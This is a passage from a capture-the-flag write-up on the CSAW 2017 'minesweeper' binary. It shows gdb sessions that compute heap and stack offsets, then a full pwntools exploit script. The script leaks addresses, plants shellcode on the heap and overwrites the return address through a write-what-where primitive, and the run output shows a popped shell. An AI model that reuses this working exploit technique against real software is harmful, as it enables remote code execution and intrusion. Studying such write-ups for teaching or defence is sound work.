So we can see we that we overflowed `edx` with four `8`s, and overflowed `eax+0x8` with four `7`s (I know the last octet is different, that is due to some operations that happen after our overflow). As a result from the start of our input, there is `92` bytes untill we overflow the value which will be stored in `edx`, and `88` bytes untill we overflow the value which will be stored in `eax+0x8`.

##### Infoleak Pointers

The last two things which we need to know are the offset from the start of the heap to the start of our input in the heap for the board which will overflow it, and the offset from our stack leak to the return address. To figure out the first, we can just see the difference between where our input in the previous `input offset` and the star of the heap is:

```
gdb-peda$ find XXXXXzzzzzzzzzzzz
Searching for 'XXXXXzzzzzzzzzzzz' in: None ranges
Found 1 results, display max 1 items:
[heap] : 0x804c048 ("XXXXX", 'z' <repeats 55 times>, "000011112222333344445555\022")
gdb-peda$ vmmap
Start      End        Perm	Name
0x08048000 0x0804b000 r-xp	/Hackery/csaw17/pwn/minesweeper/minesweeper
0x0804b000 0x0804c000 rwxp	/Hackery/csaw17/pwn/minesweeper/minesweeper
0x0804c000 0x0804d000 rwxp	[heap]
0xf7dff000 0xf7e00000 rwxp	mapped
0xf7e00000 0xf7fb0000 r-xp	/lib/i386-linux-gnu/libc-2.23.so
0xf7fb0000 0xf7fb2000 r-xp	/lib/i386-linux-gnu/libc-2.23.so
0xf7fb2000 0xf7fb3000 rwxp	/lib/i386-linux-gnu/libc-2.23.so
0xf7fb3000 0xf7fb6000 rwxp	mapped
0xf7fd3000 0xf7fd4000 rwxp	mapped
0xf7fd4000 0xf7fd7000 r--p	[vvar]
0xf7fd7000 0xf7fd9000 r-xp	[vdso]
0xf7fd9000 0xf7ffc000 r-xp	/lib/i386-linux-gnu/ld-2.23.so
0xf7ffc000 0xf7ffd000 r-xp	/lib/i386-linux-gnu/ld-2.23.so
0xf7ffd000 0xf7ffe000 rwxp	/lib/i386-linux-gnu/ld-2.23.so
0xfffdd000 0xffffe000 rwxp	[stack]
```

and with a bit of Python, we can see what the difference is:

```
>>> hex(0x804c048 - 0x0804c000)
'0x48'
```

So we know the offset between the start of the heap and our input is `0x48`. Next we need to find the offset between our stack leak and th return address. For that, we can just pick up in gdb from where we left off and look at where the return address is:

```
gdb-peda$ i f
Stack level 0, frame at 0xffffce10:
 eip = 0x8049855; saved eip = 0x80499ea
 called by frame at 0xffffce50
 Arglist at 0xffffce08, args: 
 Locals at 0xffffce08, Previous frame's sp is 0xffffce10
 Saved registers:
  ebp at 0xffffce08, eip at 0xffffce0c
```

In this iteration of the program, the stack leak was `0xffffce3b`. With that, we can figure out the offset:

```
>>> hex(0xffffce0c - 0xffffce3b)
'-0x2f'
```

So we can see that the offset between the stack leak and the return address is `-0x2f`. Remember we will need to take another `-0x8` off, because it adds `8` to that value.

## tl ; dr

So putting it all together, this is how we will pwn the binary:

*	View an uninitizalized board to get a stack infoleak.
*	Initialize a 5 by 5 board and view it to get a heap infoleak
*	Construct a payload which will store shellcode in the heap, and do a write what where to overwrite the return address to point to our shellcode

## Exploit

Here is our exploit. For the shellcode, we had to jump through a couple of loops. Look to the comments in the exploit for more info.

```
# This exploit is based off of: https://github.com/ByteBandits/writeups/blob/master/csaw-quals-2017/pwn/minesweeper/sudhackar/README.md

from pwn import *

# Establish the target connection
#server = process('./minesweeper')
#gdb.attach(server)
target = remote('127.0.0.1', 31337)


# Establish the function used to interface with the code
def recvMainMenu():
	target.recvuntil("3) Q (Quit)\n")


def recvNewMenu():
	target.recvuntil("3) Quit game (Q)\n")

def recvLines(x):
	for i in xrange(x):
		target.recvline()

def initializeGame(payload, x, y, q = True):
	target.sendline("I")
	target.recvline()
	target.sendline("B " + str(x) + " " + str(y))
	target.recvuntil("character X\n")
	target.sendline(payload)
	if q == True:
		target.recvuntil("3) Q (Quit)\n")

# Leak the stack infoleak by just viewing an unintialized board
recvMainMenu()
target.sendline("N")
recvNewMenu()
target.sendline("V")
recvLines(16)
stackLeak = u32(target.recv(5)[1:5])
log.info("Stack Leak: " + hex(stackLeak))
recvLines(9)
target.sendline('Q')
target.recvuntil("3) Q (Quit)")

# Initialize a 25 (5 x 5) board to setup the heap to leak a heap address
initializeGame("X"*5 + "0"*20, 5, 5)

# View the newly initalized board to get the heap infoleak
target.sendline("N")
recvNewMenu()
target.sendline("V")
recvLines(6)
heapLeak = target.recvline().replace("\x0a", "")
heapLeak = u32(heapLeak[2:4] + heapLeak[0:2])
log.info("Start of the heap is: " + hex(heapLeak))
target.sendline('Q')
target.recvuntil("3) Q (Quit)")

'''
For our shellcode have to jump through a couple of hoops. The '\xeb\x06' in the first two bytes stands for Jump ahead six instructions. As a part of the custom malloc, it writes over 
some of the values for our payload, so this is to get around that.

This will place us at the `mov ebp, 0x4`. Before our shellcode starts, it has a ptr stored in ebp, which needs to be set to 4 in order for the shellcode to work
(first instruction of the shellcode is `move ebx, ebp`)

After that we just use the pwntools built in i386 shellcode to call /bin/sh
'''

shellcode = '\xeb\x06'+'X'*4+'\x90'*2+asm('mov ebp,0x4')+asm(pwnlib.shellcraft.i386.linux.dupsh())

'''
Next we send the payload, which consists of the following

* Our shellcode
* 0's to bridge the gap between our shellcode, and the address we are writing to (return address)
* The ptr we are writing to (the return address)
* The value we are writing to the ptr (the address of our shellcode)
* Four X's to get us to 100 characters, and pass the requirement to have an 'X' character
'''

payload = shellcode + (88 - len(shellcode))*"0" + p32(stackLeak - 0x2f - 0x8) + p32(heapLeak + 0x48) + "X"*4

# Initialize the board with our payload, to pop a shell
initializeGame(payload, 10, 10, False)

# Drop to an interactive shell, to use the shell we just popped
target.interactive()
```

and when we run it:

```
$	python exploit.py
[+] Opening connection to 127.0.0.1 on port 31337: Done
[*] Stack Leak: 0xffefd6db
[*] Start of the heap is: 0x8c9b000
[*] Switching to interactive mode
$ ls
exploit.py
minesweeper
peda-session-dash.txt
peda-session-ls.txt
peda-session-minesweeper.txt
readme.md
solved.py
$ w
 15:56:03 up  1:34,  1 user,  load average: 1.10, 0.92, 0.95
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
guy      tty7     :0               14:21    1:34m  1:26   0.15s /sbin/upstart --user
```

Just like that, we popped a shell!
